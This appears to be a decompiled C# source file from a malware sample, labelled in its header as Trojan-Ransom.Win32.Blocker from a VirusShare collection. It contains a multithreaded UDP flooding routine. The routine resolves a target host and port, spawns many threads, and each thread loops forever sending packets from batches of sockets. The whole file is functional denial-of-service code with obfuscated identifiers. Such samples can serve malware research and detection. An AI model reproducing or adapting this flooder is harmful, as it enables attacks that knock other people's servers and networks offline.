// Decompiled with JetBrains decompiler
// Type: ?1?.?9?
// Assembly: tutzutzutz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 24544FBB-E29C-4CD0-A180-E0F7591B8C92
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hela-60428f68afac01b391496fe7183b4795cc29d1e6528c4ef1f2dec9ea939ee5e7.exe

using \u003F1\u003F;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace \u003F1\u003F
{
  internal class \u003F9\u003F
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static IPEndPoint IPEo;
    public static ushort uPort;
    public static int iPSize;
    private static \u003F9\u003F.\u003F10\u003F[] UDPClass;
    public static int iThreads;
    public static int iUDPSockets;

    public static void \u003F45\u003F()
    {
      try
      {
        \u003F9\u003F.IPEo = new IPEndPoint(Dns.GetHostEntry(\u003F9\u003F.sFHost).AddressList[0], (int) \u003F9\u003F.uPort);
      }
      catch
      {
        \u003F9\u003F.IPEo = new IPEndPoint(IPAddress.Parse(\u003F9\u003F.sFHost), (int) \u003F9\u003F.uPort);
      }
      \u003F9\u003F.tFloodingThread = new Thread[\u003F9\u003F.iThreads];
      \u003F9\u003F.tFloodingJob = new ThreadStart[\u003F9\u003F.iThreads];
      \u003F9\u003F.UDPClass = new \u003F9\u003F.\u003F10\u003F[\u003F9\u003F.iThreads];
      for (int index = 0; index < \u003F9\u003F.iThreads; ++index)
      {
        \u003F9\u003F.UDPClass[index] = new \u003F9\u003F.\u003F10\u003F(\u003F9\u003F.IPEo, \u003F9\u003F.iUDPSockets, \u003F9\u003F.iPSize);
        \u003F9\u003F.tFloodingJob[index] = new ThreadStart(\u003F9\u003F.UDPClass[index].\u003F47\u003F);
        \u003F9\u003F.tFloodingThread[index] = new Thread(\u003F9\u003F.tFloodingJob[index]);
        \u003F9\u003F.tFloodingThread[index].Start();
      }
    }

    public static void \u003F46\u003F()
    {
      for (int index = 0; index < \u003F9\u003F.iThreads; ++index)
      {
        try
        {
          \u003F9\u003F.tFloodingThread[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class \u003F10\u003F
    {
      private IPEndPoint IPEo;
      private int iPSize;
      private Socket[] pSocket;
      private int iUDPSockets;

      public \u003F10\u003F(IPEndPoint _param1, int _param2, int _param3)
      {
        this.IPEo = _param1;
        this.iUDPSockets = _param2;
        this.iPSize = _param3;
      }

      public void \u003F47\u003F()
      {
        while (true)
        {
          byte[] buffer = new byte[this.iPSize];
          try
          {
            this.pSocket = new Socket[this.iUDPSockets];
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              this.pSocket[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              this.pSocket[index].Blocking = false;
              this.pSocket[index].SendTo(buffer, (EndPoint) this.IPEo);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.iUDPSockets; ++index)
            {
              try
              {
                if (this.pSocket[index].Connected)
                  this.pSocket[index].Disconnect(false);
                this.pSocket[index].Close();
                this.pSocket[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
